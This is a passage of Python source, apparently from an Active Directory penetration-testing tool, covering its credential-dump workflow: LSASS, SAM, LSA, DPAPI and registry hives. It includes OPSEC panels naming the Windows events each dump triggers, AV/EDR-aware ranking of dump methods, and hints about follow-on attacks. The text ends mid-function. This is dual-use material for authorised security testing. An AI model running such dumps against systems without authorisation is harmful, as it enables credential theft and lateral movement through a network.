"""Credential dump helpers for the CLI.

This module contains all credential and data extraction operations (dumps),
regardless of the protocol used (SMB, WinRM, Impacket, etc.).

Scope:
- Registry dumps (SAM/SECURITY/SYSTEM hives)
- LSA secrets extraction
- SAM database dumps
- DPAPI credential extraction
- LSASS memory dumps
- Hash extraction from dumped data

Module structure:
- `run_dump_*` functions: Build commands and orchestrate dump operations
- `execute_dump_*` functions: Execute commands and process output to extract credentials

All dump-related logic (command construction, execution, and output processing)
is centralized in this module for consistency and maintainability.
"""

from __future__ import annotations

from dataclasses import dataclass
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Callable
import asyncio
import os
import re

from rich.prompt import Confirm

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_table,
    print_info_debug,
    print_info_verbose,
    print_instruction,
    print_panel,
    print_success,
    print_warning,
    print_operation_header,
    telemetry,
)
from adscan_internal.services.exploitation.lsass import (
    parse_pypykatz_credentials,
)
from adscan_internal.rich_output import (
    ScanProgressTracker,
    confirm_operation,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.workspaces.computers import (
    consume_service_targeting_fallback_notice,
    resolve_domain_service_target_file,
)
from adscan_internal.workspaces.subpaths import domain_relpath


from adscan_internal.services.exploitation.native_dump_service import NativeDumpService
from adscan_internal.services.exploitation.dpapi_native_dump import (
    DpapiNativeDumpService,
    DpapiDumpResult as DpapiFullDumpResult,
)
from adscan_internal.services.exploitation.dump_display import (
    DumpDisplay,
    CredentialType,
)
from adscan_internal.services.smb_transport import SMBConfig
from adscan_internal.services.async_bridge import run_async_sync

from rich.table import Table
from rich.panel import Panel
from rich import box as rbox
from rich.console import Console as RichConsole
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.text import Text as RichText

from adscan_internal.services.exploitation.host_fingerprint_service import (
    HostFingerprint,
    HostFingerprintService,
)
from adscan_internal.services.host_reachability_filter import (
    filter_reachable_hosts,
    print_reachability_summary,
    render_no_reachable_panel,
)
from adscan_internal.services.smb_privilege import (
    SMBPrivilegeConfig,
    SMBPrivilegeStatus,
    check_smb_privilege_batch,
)
from adscan_internal.services.exploitation.lsass_orchestrator import (
    LsassMethod,
    LsassMethodSelector,
    LsassDumpOrchestrator,
    _ALL_METHODS,
)
from adscan_internal.workspaces.edr_intelligence import EdrIntelligence
from adscan_core.rich_output_collection import (
    SessionHeader,
    SessionLootCard,
    print_session_header,
    print_session_loot_card,
)
from adscan_core.theme import (
    COLOR_AMBER,
    COLOR_CRIMSON,
    COLOR_MUTED,
    COLOR_SAGE,
    COLOR_STEEL,
)

# ---------------------------------------------------------------------------
# Operator Dark palette  -  mapped onto adscan_core.theme semantic slots so
# the dump UX participates in the global ADscan palette and a single theme
# refresh propagates everywhere. Local aliases stay short for the
# high-frequency call sites below.
#
# Slot mapping (semantic -> file alias):
#   COLOR_SAGE    -> _ACID    : success, recovered credentials, yes
#   COLOR_STEEL   -> _ICE     : structural info, host names, section accents
#   COLOR_AMBER   -> _AMBER   : caution, OPSEC warnings, uploads
#   COLOR_CRIMSON -> _LAVA    : failure, EDR catch, high-severity actions
#   COLOR_MUTED   -> _MUTED   : secondary labels, pending, metadata
# ---------------------------------------------------------------------------
_ACID = COLOR_SAGE
_ICE = COLOR_STEEL
_AMBER = COLOR_AMBER
_LAVA = COLOR_CRIMSON
_MUTED = COLOR_MUTED

_CONSOLE = RichConsole()


def _render_fingerprint_panel(fp: HostFingerprint, ranked: list[LsassMethod]) -> None:
    """Print host security posture panel + ranked method table."""
    if fp.ppl_level == 0:
        ppl_label = f"[{_ACID}]off[/{_ACID}]"
    elif fp.ppl_level == 1:
        ppl_label = f"[{_LAVA}]RunAsPPL=1  (PPL enabled)[/{_LAVA}]"
    else:
        ppl_label = f"[{_LAVA}]RunAsPPL={fp.ppl_level}  (PPLLsa)[/{_LAVA}]"

    lines: list[str] = [
        f"[{_MUTED}]  Host    [/{_MUTED}] [{_ICE}]{fp.target_ip}[/{_ICE}]",
        f"[{_MUTED}]  PPL     [/{_MUTED}] {ppl_label}",
    ]

    if fp.detected_products:
        for p in fp.detected_products:
            cat_color = _LAVA if p.category == "edr" else _AMBER
            cat_badge = f"[bold {cat_color}]{'EDR' if p.category == 'edr' else ' AV '}[/bold {cat_color}]"
            if p.active:
                state = f"[{_LAVA}]● ACTIVE[/{_LAVA}]"
            elif p.running and not p.realtime_protection:
                state = f"[{_AMBER}]○ running  RTP off[/{_AMBER}]"
            else:
                state = f"[{_MUTED}]○ installed  inactive[/{_MUTED}]"
            lines.append(f"  {cat_badge}  [bold]{p.name}[/bold]  {state}")
    else:
        lines.append(
            f"[{_MUTED}]  AV/EDR  [/{_MUTED}] [{_ACID}]none detected[/{_ACID}]"
        )

    # Selected method rationale line
    if ranked:
        best = ranked[0]
        reasons: list[str] = []
        if fp.ppl_enabled and best.ppl_safe:
            reasons.append("PPL-safe")
        if not best.needs_upload:
            reasons.append("no upload")
        if not fp.has_edr and not fp.ppl_enabled:
            reasons.append("clean host → LOTL preferred")
        rationale = "  ·  ".join(reasons) if reasons else best.description[:60]
        lines.append("")
        lines.append(
            f"[{_MUTED}]  Selected[/{_MUTED}] [{_ACID}]{best.display}[/{_ACID}]"
            f"  [{_MUTED}]({rationale})[/{_MUTED}]"
        )

    _CONSOLE.print(
        Panel(
            "\n".join(lines),
            title=f"[bold {_ICE}]◉  Host Intel[/bold {_ICE}]",
            subtitle=f"[{_MUTED}]{fp.elapsed_s:.1f}s[/{_MUTED}]",
            border_style=_ICE,
            padding=(0, 1),
        )
    )

    # Ranked methods table (compact: show top 5 only)
    table = Table(
        box=rbox.SIMPLE,
        show_header=True,
        header_style=f"bold {_ICE}",
        pad_edge=False,
        show_edge=False,
    )
    table.add_column("#", style=_MUTED, width=3)
    table.add_column("Method", style="bold white", min_width=30)
    table.add_column("PPL", width=5, justify="center")
    table.add_column("Upload", width=7, justify="center")
    table.add_column("OPSEC", width=7)

    for i, m in enumerate(ranked[:5], 1):
        ppl_cell = f"[{_ACID}]✓[/{_ACID}]" if m.ppl_safe else f"[{_LAVA}]✗[/{_LAVA}]"
        upload_cell = (
            f"[{_AMBER}]yes[/{_AMBER}]" if m.needs_upload else f"[{_ACID}]no[/{_ACID}]"
        )
        opsec_color = (
            _ACID if m.opsec_score >= 4 else (_AMBER if m.opsec_score >= 3 else _LAVA)
        )
        opsec_bar = f"[{opsec_color}]{'█' * m.opsec_score}[/{opsec_color}][{_MUTED}]{'░' * (5 - m.opsec_score)}[/{_MUTED}]"
        if i == 1:
            num = f"[bold {_ACID}]→[/bold {_ACID}]"
            name_cell = f"[bold {_ACID}]{m.display}[/bold {_ACID}]"
        else:
            num = f"[{_MUTED}]{i}[/{_MUTED}]"
            name_cell = f"[{_MUTED}]{m.display}[/{_MUTED}]"
        table.add_row(num, name_cell, ppl_cell, upload_cell, opsec_bar)

    _CONSOLE.print(table)


def _prompt_method_confirm(ranked: list[LsassMethod]) -> LsassMethod | None:
    """Ask operator to confirm or override the selected method.

    Returns the method to use, or None if the operator chose to abort.
    Accepts: Enter (confirm), 1-N (pick method by rank), q (quit).
    """
    from rich.prompt import Prompt as _RPrompt

    best = ranked[0]
    upload_tag = f"  [{_AMBER}]↑ uploads binary[/{_AMBER}]" if best.needs_upload else ""
    _CONSOLE.print(
        f"\n  [{_MUTED}]Selected[/{_MUTED}]  [{_ACID}]{best.display}[/{_ACID}]{upload_tag}"
    )
    n = min(len(ranked), 7)
    _CONSOLE.print(
        f"  [{_MUTED}]Enter[/{_MUTED}] to confirm"
        f"  [{_MUTED}]·[/{_MUTED}]  [{_MUTED}]1-{n}[/{_MUTED}] to pick"
        f"  [{_MUTED}]·[/{_MUTED}]  [{_MUTED}]q[/{_MUTED}] to quit\n"
    )
    answer = _RPrompt.ask("  ?", default="y", console=_CONSOLE).strip().lower()
    if answer in ("q", "quit", "n", "no", "0"):
        return None
    if answer.isdigit():
        idx = int(answer) - 1
        if 0 <= idx < len(ranked):
            return ranked[idx]
    return best


def _make_method_failed_gate(
    ranked: list[LsassMethod],
) -> Callable[[LsassMethod, "LsassMethod | None"], bool]:
    """Return a mid-cascade gate callback for interactive single-host dumps.

    After each failed attempt, asks the operator whether to try the next method.
    Skips the prompt when no further methods remain (let the orchestrator handle
    the exhausted-methods result).
    """
    from rich.prompt import Confirm as _RConfirm

    def _gate(failed: LsassMethod, next_method: LsassMethod | None) -> bool:
        if next_method is None:
            return True  # nothing left to ask; let orchestrator produce the failure result
        upload_tag = (
            f"  [{_AMBER}](uploads binary)[/{_AMBER}]"
            if next_method.needs_upload
            else ""
        )
        _CONSOLE.print(
            f"\n  [{_AMBER}]↻[/{_AMBER}]  Next: [{_ACID}]{next_method.display}[/{_ACID}]{upload_tag}"
        )
        return _RConfirm.ask(
            f"  [{_ICE}]Try it?[/{_ICE}]", default=True, console=_CONSOLE
        )

    return _gate


def _render_catch_alert(method_name: str, product: str) -> None:
    _CONSOLE.print(
        Panel(
            f"[{_LAVA}]Method [bold]{method_name}[/bold] was caught by [bold]{product}[/bold].[/{_LAVA}]\n"
            f"[{_MUTED}]Catch recorded. Future attempts against hosts with {product} will be warned.[/{_MUTED}]",
            title=f"[bold {_LAVA}]⚠ AV/EDR CATCH DETECTED[/bold {_LAVA}]",
            border_style=_LAVA,
        )
    )


def _render_global_edr_warnings(warnings: list[str]) -> None:
    if not warnings:
        return
    body = "\n".join(f"[{_AMBER}]• {w}[/{_AMBER}]" for w in warnings)
    _CONSOLE.print(
        Panel(
            body,
            title=f"[bold {_AMBER}]◈ Global EDR Intelligence[/bold {_AMBER}]",
            border_style=_AMBER,
        )
    )


# ---------------------------------------------------------------------------
# OPSEC disclosure gates  -  every dump path discloses Windows event telemetry
# before any confirmation prompt. Severity-matched per tui-design Dialogs:
# reversible / moderate / severe.
# ---------------------------------------------------------------------------
_OPSEC_PROFILES: dict[str, dict[str, Any]] = {
    "lsass": {
        "severity": "severe",
        "icon": "▲",
        "border": _LAVA,
        "summary": "Highly logged. Triggers Microsoft Defender / MDE / MDI alerts.",
        "events": [
            "4688  -  process creation (comsvcs.dll / rundll32 / handle pivot)",
            "4663  -  object access on lsass.exe",
            "Sysmon 10  -  process access of lsass.exe (most SOCs alert on this)",
            "MDI / MDE  -  \"Suspicious LSASS access\" telemetry",
        ],
        "blast": "Single host. Drops a temporary file on ADMIN$ before retrieval.",
    },
    "sam": {
        "severity": "moderate",
        "icon": "●",
        "border": _AMBER,
        "summary": "Backup Operators path. Visible via remote registry telemetry.",
        "events": [
            "4624 / 4672  -  logon + special-privileges assigned (SeBackup)",
            "4656 / 4663  -  registry hive open with REG_OPTION_BACKUP_RESTORE",
            "Sysmon 12 / 13  -  registry create / value-set on SAM key",
        ],
        "blast": "Reads SAM + SYSTEM hives via RRP. No binary upload.",
    },
    "lsa": {
        "severity": "moderate",
        "icon": "●",
        "border": _AMBER,
        "summary": "SECURITY hive read via remote registry; cached secrets exposed.",
        "events": [
            "4624 / 4672  -  logon + special-privileges assigned",
            "4656 / 4663  -  registry hive open against SECURITY",
            "Sysmon 12 / 13  -  registry telemetry on SECURITY key",
        ],
        "blast": "Reads SECURITY + SYSTEM hives via RRP. No binary upload.",
    },
    "dpapi": {
        "severity": "low",
        "icon": "○",
        "border": _ICE,
        "summary": "Reads DPAPI material; quiet on EDR unless DA backup-key route fails over.",
        "events": [
            "4624  -  logon to the DC (DA route) or target host (non-DA route)",
            "5145  -  SMB share access on ADMIN$ for masterkey retrieval",
        ],
        "blast": "DA route: reads backup-key PVK from DC. Non-DA route: per-user masterkeys only.",
    },
    "registry": {
        "severity": "moderate",
        "icon": "●",
        "border": _AMBER,
        "summary": "Same surface as SAM + LSA combined against the PDC.",
        "events": [
            "4624 / 4672  -  logon + special-privileges assigned (SeBackup)",
            "4656 / 4663  -  registry hive open against SAM, SECURITY, SYSTEM",
        ],
        "blast": "Reads three hives from the PDC via RRP. No binary upload.",
    },
}


def _render_opsec_panel(dump_kind: str, *, target_label: str) -> None:
    """Print an OPSEC disclosure panel before any dump-action confirmation.

    Discloses the Windows event IDs the operation will plausibly trigger,
    the blast radius, and a one-line severity summary. Color + leading
    glyph pairing keeps the panel readable under NO_COLOR.
    """
    profile = _OPSEC_PROFILES.get(dump_kind.lower())
    if not profile:
        return

    severity = profile["severity"]
    icon = profile["icon"]
    border = profile["border"]
    sev_label = {
        "severe": f"[bold {_LAVA}]SEVERE[/bold {_LAVA}]",
        "moderate": f"[bold {_AMBER}]MODERATE[/bold {_AMBER}]",
        "low": f"[bold {_ICE}]LOW[/bold {_ICE}]",
    }[severity]

    lines: list[str] = [
        f"[{_MUTED}]  Target    [/{_MUTED}] {target_label}",
        f"[{_MUTED}]  Severity  [/{_MUTED}] {sev_label}  [{_MUTED}]{profile['summary']}[/{_MUTED}]",
        f"[{_MUTED}]  Blast     [/{_MUTED}] [{_MUTED}]{profile['blast']}[/{_MUTED}]",
        "",
        f"[bold {border}]  Telemetry this will plausibly trigger[/bold {border}]",
    ]
    for ev in profile["events"]:
        lines.append(f"[{_MUTED}]    {icon}  {ev}[/{_MUTED}]")

    _CONSOLE.print(
        Panel(
            "\n".join(lines),
            title=f"[bold {border}]{icon}  {dump_kind.upper()} Dump  ·  OPSEC[/bold {border}]",
            border_style=border,
            padding=(0, 1),
        )
    )


def _confirm_severe_lsass(target_label: str, host: str) -> bool:
    """Severity-matched LSASS gate. Operator must explicitly type the host
    short name (or `y` as a soft confirm) to proceed.

    Per tui-design Dialogs table: severe / irreversible actions require an
    explicit resource-name input, not a default-yes. LSASS is the loudest
    Windows telemetry surface in the dump catalog; the gate exists to keep
    accidental keystrokes from generating SOC tickets.
    """
    from rich.prompt import Prompt as _RPrompt

    short = (host.split(".")[0] if host else "").strip()
    if not short or short.lower() in {"all", "all hosts"}:
        # Bulk path has its own confirmation panel; fall through to a simple yes.
        return Confirm.ask(
            f"  [{_LAVA}]Proceed with LSASS dump?[/{_LAVA}]",
            default=False,
            console=_CONSOLE,
        )

    _CONSOLE.print(
        f"\n  [{_MUTED}]Type [/{_MUTED}][bold {_LAVA}]{short}[/bold {_LAVA}]"
        f"  [{_MUTED}]to confirm, or [/{_MUTED}][bold {_LAVA}]y[/bold {_LAVA}]"
        f"  [{_MUTED}]to override the gate, or Enter to abort.[/{_MUTED}]"
    )
    answer = _RPrompt.ask("  ?", default="", console=_CONSOLE).strip()
    if not answer:
        return False
    return answer == short or answer.lower() in {"y", "yes"}


def _render_bulk_next_hint(
    dump_kind: str,
    *,
    finding_count: int,
    succeeded: int,
    domain: str | None = None,
    extra: str | None = None,
) -> None:
    """Action-oriented `Next:` hint shown after a bulk summary.

    Verdict-first language: leads with what was recovered (`{finding_count}
    credentials`) and points the operator at the most useful next step
    instead of leaving them at an empty prompt.

    ``domain`` is interpolated into command suggestions so the operator
    can copy-paste the hint verbatim. When the caller has no domain
    context the literal ``<domain>`` placeholder is shown — never the
    bare ``attack_paths owned`` form, which would parse as ``domain=owned``
    and fail at runtime.
    """
    kind = dump_kind.upper()
    # Use the literal placeholder only as a last resort — every bulk
    # dump entrypoint owns a `domain` parameter, so this branch is
    # defensive against a future caller that forgets to pass it.
    domain_token = (domain or "").strip() or "<domain>"
    if finding_count == 0 and succeeded == 0:
        hint = (
            "Verify reachability and credentials; check the OPSEC panel for "
            "which event IDs would have fired if auth had landed."
        )
    elif finding_count == 0:
        hint = (
            f"Auth landed on {succeeded} host(s) but no credentials were "
            "recovered. Try a different dump kind or rotate identities."
        )
    elif kind == "SAM":
        hint = (
            "Use the reuse matrix above to spot multi-host admins, then run "
            f"`attack_paths {domain_token} owned` to materialize the new edges."
        )
    elif kind == "LSA":
        hint = (
            "Machine-account hashes can be used for silver tickets or RBCD; "
            "try `kerberoast` or `hassession` from any DC$."
        )
    elif kind == "DPAPI":
        hint = (
            "Backup-key GUIDs above unlock per-user masterkeys; pair with a "
            "DPAPI credential dump from the same host."
        )
    elif kind == "LSASS":
        hint = (
            "Recovered identities are now in the credential store; run "
            f"`attack_paths {domain_token} owned` and check if any cred is DA-eligible."
        )
    else:
        hint = "Continue with the next attack-path action."

    if extra:
        hint = f"{hint}  {extra}"

    _CONSOLE.print(
        f"  [{_MUTED}][bold]Next:[/bold]  {hint}[/{_MUTED}]\n"
    )



def _load_dump_ip_hostname_inventory(shell: Any, domain: str) -> dict | None:
    """Load the workspace IP→hostname inventory for one domain, if available."""
    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    domains_dir = getattr(shell, "domains_dir", None) or ""
    if not workspace_dir or not domains_dir:
        return None
    try:
        from adscan_internal.services.kerberos_hostname_inventory import (
            load_workspace_ip_hostname_inventory,
        )

        return (
            load_workspace_ip_hostname_inventory(
                workspace_dir=workspace_dir,
                domains_dir=domains_dir,
                domain=domain,
            )
            or None
        )
    except Exception:  # noqa: BLE001 - inventory is best-effort
        return None


def _build_smb_config_from_shell(shell: Any, host: str, domain: str) -> SMBConfig:
    """Build an SMBConfig from the shell's current credential context.

    Used by the native dump path to build an aiosmb connection without any
    subprocess-based credential dumping dependency.

    ``host`` may be an IP. Kerberos service tickets cannot bind to ``cifs/<ip>``,
    so we route the (possibly-IP) target through the centralized
    :func:`resolve_spn_or_decide_ntlm` helper: it resolves the host FQDN from the
    workspace inventory / ``domains_data`` for the SPN, and when no FQDN is
    recoverable it decides whether NTLM is a permitted fallback (posture-gated).
    Without this the dump aborted with "Kerberos cannot use IP address as the
    service SPN host" against any lateral host reached only by IP.
    """
    from adscan_internal.models.domain import resolve_dc_ip
    from adscan_internal.services.domain_posture import get_posture
    from adscan_internal.services.kerberos_spn_resolution import (
        resolve_spn_or_decide_ntlm,
    )

    creds = getattr(shell, "current_creds", None) or {}
    domains_data = getattr(shell, "domains_data", None) or {}
    inventory = _load_dump_ip_hostname_inventory(shell, domain)
    try:
        posture_snapshot = get_posture(domains_data, domain=domain)
    except Exception:  # noqa: BLE001 - posture read is best-effort
        posture_snapshot = None

    resolved_dc_ip = None
    try:
        resolved_dc_ip = resolve_dc_ip(domains_data.get(domain) or {})
    except Exception:  # noqa: BLE001
        resolved_dc_ip = None
    # The Kerberos KDC is ALWAYS the domain's DC — never the target host. When
    # dumping a lateral member server (e.g. BRAAVOS) the target host is not a
    # KDC, so falling back to it makes Kerberos try to reach a KDC on port 88 of
    # the member (ECONNREFUSED). See CLAUDE.md § "DC/KDC IP from domains_data —
    # always resolve_dc_ip()": a silent None must NOT degrade to the target IP.
    kdc_ip = (
        resolved_dc_ip
        or creds.get("dc_ip")
        or getattr(shell, "current_dc_ip", None)
    )
    is_dc_target = bool(
        host and resolved_dc_ip and str(host).strip() == str(resolved_dc_ip).strip()
    )

    resolution = resolve_spn_or_decide_ntlm(
        target_host=host,
        domain=domain,
        domains_data=domains_data,
        ip_hostname_inventory=inventory,
        resolver_ip=kdc_ip,
        posture_snapshot=posture_snapshot,
        is_dc_target=is_dc_target,
    )

    # Original Kerberos intent from the credential material (ccache/aes ⇒ Kerberos).
    wants_kerberos = bool(creds.get("ccache_path") or creds.get("aes_key"))
    has_ntlm_cred = bool(creds.get("password") or creds.get("nt_hash"))

    # A LOCAL-scope credential (the islocal dump path sets auth_domain="") is a
    # local SAM account, NOT a domain principal — it cannot obtain a Kerberos
    # TGT, so it must authenticate over NTLM regardless of the Kerberos-first
    # posture. Domain credentials (auth_domain set) keep the Kerberos-first
    # logic below untouched.
    force_ntlm_local = ("auth_domain" in creds) and not str(
        creds.get("auth_domain") or ""
    ).strip()

    if resolution.kerberos_viable:
        spn_host = resolution.spn_host
        use_kerberos = wants_kerberos
    else:
        # No FQDN for the SPN. Use NTLM when we hold an NTLM-capable credential
        # and posture has not observed NTLM disabled (HIGH). Otherwise leave the
        # original intent and let the transport surface a clear error — never
        # silently request cifs/<ip>, which the KDC rejects.
        spn_host = host
        if has_ntlm_cred and resolution.ntlm_fallback_ok:
            use_kerberos = False
        else:
            use_kerberos = wants_kerberos
        print_info_debug(
            f"[dump] SMB SPN resolution for {host}: {resolution.reason}; "
            f"use_kerberos={use_kerberos} has_ntlm_cred={has_ntlm_cred}"
        )

    if force_ntlm_local and use_kerberos:
        use_kerberos = False
        print_info_debug(
            f"[dump] local-scope credential on {host} → forcing NTLM "
            "(a local SAM account cannot obtain a Kerberos TGT)"
        )

    # --- Per-principal Kerberos credential resolution (anti-hijack) -------- #
    # When Kerberos resolves true but no explicit ccache/aes is in scope, the
    # SMB transport would otherwise fall back to the ambient $KRB5CCNAME — i.e.
    # bind as whoever's TGT is active (the DA after a DCSync), NOT the requested
    # principal. This is the daenerys-as-administrator hijack on the dump path,
    # whose blast radius is DCSync / secretsdump / lateral / lsass. Resolve a
    # ccache for THIS exact principal, scoped-ticket-first.
    ccache_override = creds.get("ccache_path")
    exec_username = str(creds.get("username") or "").strip()
    cred_auth_domain = str(creds.get("auth_domain") or domain or "").strip()
    if (
        use_kerberos
        and not str(ccache_override or "").strip()
        and not str(creds.get("aes_key") or "").strip()
        and exec_username
        and cred_auth_domain
    ):
        ccache_override = _resolve_dump_kerberos_ccache(
            shell,
            domain=cred_auth_domain,
            username=exec_username,
            password=creds.get("password"),
            target_host=host,
            dc_ip=kdc_ip,
        )
        if not str(ccache_override or "").strip():
            # No per-principal ccache could be produced (mint failed, no scoped
            # ticket). Fall back to NTLM when we hold an NTLM-capable secret
            # rather than letting the transport bind as the ambient principal.
            if has_ntlm_cred:
                use_kerberos = False
                print_info_debug(
                    f"[dump] no per-user ccache for "
                    f"{mark_sensitive(exec_username, 'user')} on "
                    f"{mark_sensitive(host, 'host')}; forcing NTLM (refusing the "
                    "ambient $KRB5CCNAME principal)"
                )
            else:
                print_warning(
                    "Could not obtain a Kerberos ticket for "
                    f"{mark_sensitive(exec_username, 'user')} and no NTLM secret "
                    "is available; the dump may fail to authenticate as the "
                    "intended principal."
                )

    return SMBConfig(
        target_ip=host,
        target_hostname=spn_host,
        domain=domain,
        auth_domain=creds.get("auth_domain") or domain,
        username=creds.get("username"),
        password=creds.get("password"),
        nt_hash=creds.get("nt_hash"),
        aes_key=creds.get("aes_key"),
        ccache_path=ccache_override,
        use_kerberos=use_kerberos,
        kdc_ip=kdc_ip,
        ip_hostname_inventory=inventory,
        posture_snapshot=posture_snapshot,
    )


def _resolve_dump_kerberos_ccache(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str | None,
    target_host: str,
    dc_ip: str | None,
) -> str | None:
    """Resolve a per-principal Kerberos ccache for a dump, scoped-ticket-first.

    Precedence (matches CLAUDE.md § "Credential storage" rule #2 + the
    capability-bearing axis):

    1. A scoped :class:`ServiceTicket` matching ``target_host`` (S4U2Proxy /
       RBCD / constrained-delegation / silver). Used AS-IS — never re-minted;
       its ``impersonated_user`` principal mismatch is intentional.
    2. A capability-bearing ccache marked for ``username`` (ESC13 PAC-TGT with a
       synthetic group SID). Used AS-IS — re-minting would drop the SID.
    3. Otherwise mint a fresh per-user TGT via the SSOT ``ensure_user_ccache``.

    Returns the ccache path, or ``None`` when nothing usable could be produced
    (the caller then drops to NTLM rather than the ambient principal).
    """
    from adscan_internal.services.credential_store_service import (
        get_capability_bearing_ccache,
        resolve_scoped_ticket_for_host,
    )

    domains_data = getattr(shell, "domains_data", None) or {}

    # 1) Scoped service ticket for THIS host — use as-is (do not mint).
    try:
        scoped = resolve_scoped_ticket_for_host(
            shell, domain=domain, host=target_host, service="cifs"
        )
    except Exception:  # noqa: BLE001 — best-effort scoped lookup
        scoped = None
    if scoped:
        _impersonated, scoped_ccache = scoped
        if str(scoped_ccache or "").strip():
            print_info_debug(
                f"[dump] using scoped service ticket for "
                f"{mark_sensitive(target_host, 'host')} (impersonation ticket — "
                "not re-minted)"
            )
            return str(scoped_ccache).strip()

    # 2) Capability-bearing ccache marked for this user — use as-is (do not mint).
    capability_ccache = get_capability_bearing_ccache(
        domains_data, domain=domain, username=username
    )
    if str(capability_ccache or "").strip():
        print_info_debug(
            f"[dump] using capability-bearing ccache for "
            f"{mark_sensitive(username, 'user')} (ESC13 PAC-TGT — not re-minted)"
        )
        return str(capability_ccache).strip()

    # 3) Generic principal — mint a fresh per-user TGT (SSOT).
    from adscan_internal.services.kerberos_ticket_service import ensure_user_ccache

    try:
        return ensure_user_ccache(
            shell,
            user=username,
            domain=domain,
            credential=(str(password).strip() or None) if password is not None else None,
            dc_ip=str(dc_ip or "").strip() or None,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_info_debug(
            "[dump] ensure_user_ccache failed for "
            f"{mark_sensitive(username, 'user')}: {exc}"
        )
        return None


def _run_native_async(coro: Any) -> Any:
    """Run an async coroutine from sync code, with event-loop fallback."""
    return run_async_sync(coro)


def _native_dump_supported(shell: Any, host: str) -> bool:
    """Return True when the native fast-path can run for this target."""
    if _is_bulk_dump_target(host):
        return False
    if not host or str(host).strip().lower() == "all":
        return False
    creds = getattr(shell, "current_creds", None) or {}
    # Need at least one usable secret.
    if not (
        creds.get("password")
        or creds.get("nt_hash")
        or creds.get("aes_key")
        or creds.get("ccache_path")
    ):
        return False
    if not creds.get("username"):
        return False
    return True


def _explicit_native_dump_supported(*, host: str, username: str, secret: str) -> bool:
    """Return True when explicit CLI dump credentials can use native SMB."""
    if _is_bulk_dump_target(host):
        return False
    if not host or str(host).strip().lower() in {"all", "all hosts"}:
        return False
    if not str(username or "").strip():
        return False
    return bool(str(secret or "").strip())


def _credential_secret_fields(secret: str) -> dict[str, str | None]:
    """Map one CLI credential value to password/hash/ccache fields."""
    secret_clean = str(secret or "").strip()
    if secret_clean.lower().endswith(".ccache"):
        return {
            "password": None,
            "nt_hash": None,
            "aes_key": None,
            "ccache_path": secret_clean,
        }
    if len(secret_clean) == 32 and all(
        char in "0123456789abcdefABCDEF" for char in secret_clean
    ):
        return {
            "password": None,
            "nt_hash": secret_clean,
            "aes_key": None,
            "ccache_path": None,
        }
    if len(secret_clean) in {32, 64} and all(
        char in "0123456789abcdefABCDEF" for char in secret_clean
    ):
        return {
            "password": None,
            "nt_hash": None,
            "aes_key": secret_clean,
            "ccache_path": None,
        }
    return {
        "password": secret_clean,
        "nt_hash": None,
        "aes_key": None,
        "ccache_path": None,
    }


@contextmanager
def _temporary_dump_creds(
    shell: Any,
    *,
    domain: str,
    username: str,
    secret: str,
    islocal: str | None,
) -> Any:
    """Temporarily expose explicit dump credentials to native dump helpers."""
    previous = getattr(shell, "current_creds", None)
    secret_fields = _credential_secret_fields(secret)
    current = dict(previous or {})
    current.update(
        {
            "username": username,
            "auth_domain": "" if str(islocal).lower() == "true" else domain,
            **secret_fields,
        }
    )
    # For machine accounts (username ending with "$"), enrich current_creds
    # with the AES-256 key derived from the raw Kerberos password (stored in
    # credentials_meta during persist_machine_account_credential).  Without
    # this, AES-only DCs reject the SMB auth because current_creds["aes_key"]
    # is None even though the derived key was already persisted.
    if (
        username.endswith("$")
        and not current.get("aes_key")
        and not current.get("ccache_path")
    ):
        try:
            from adscan_internal.services.credentials.privilege_role import get_credential_meta
            meta = get_credential_meta(shell, domain=domain, username=username)
            if isinstance(meta, dict):
                aes256_stored = meta.get("aes256_key") or meta.get("aes256")
                if aes256_stored:
                    current["aes_key"] = str(aes256_stored)
                    # Keep nt_hash intact so the auth planner can fall back to
                    # RC4 when the DC supports it; AES is preferred when the
                    # posture shows KERBEROS_AES_ONLY=ENABLED.
        except Exception:  # noqa: BLE001
            pass
    try:
        setattr(shell, "current_creds", current)
        yield
    finally:
        if previous is None:
            try:
                delattr(shell, "current_creds")
            except AttributeError:
                pass
        else:
            setattr(shell, "current_creds", previous)


_NXC_SMB_LINE_RE = re.compile(r"^\s*SMB\s+\S+\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+")
_NXC_REMOTE_LINE_RE = re.compile(
    r"^\s*(?:SMB|WINRM)\s+\S+\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+"
)
_NXC_DUMPED_CREDENTIAL_TOKEN_RE = re.compile(r"(?P<token>[^\s\\]+\\[^\s:]+:[^\s]+)")
_NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:@\\]+@[^\s:@\\]+:[^\s]+)"
)
_NXC_DUMPED_SAM_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:[^\s]*)"
)
_NXC_STATUS_TOKEN_RE = re.compile(r"\s\[(?:\+|-)\]\s")
_DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS = 300
_BULK_DUMP_COMMAND_TIMEOUT_SECONDS = 7200
_EMPTY_NTLM_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
_SAM_REUSE_EXCLUDED_USERNAMES = {
    "guest",
    "invitado",
    "defaultaccount",
    "wdagutilityaccount",
    "defaultuser0",
}
_SAM_REUSE_EXCLUDED_RIDS = {"501", "503", "504"}
_SAM_REUSE_REASON_LABELS = {
    "empty_username": "Empty username",
    "machine_account": "Machine account",
    "disabled_builtin_account": "Disabled built-in account",
    "disabled_builtin_rid": "Disabled built-in RID",
    "empty_hash": "Empty NTLM hash",
    "invalid_hash": "Invalid NTLM hash",
    "not_reused_across_hosts": "Not reused across hosts",
}


def _resolve_bulk_hosts_target(
    shell: Any,
    *,
    domain: str,
    requested_host: str,
) -> str | None:
    """Resolve the best host target for multi-host dump operations."""
    if _is_hosts_file_target(requested_host):
        return str(requested_host).strip()
    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    hosts_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
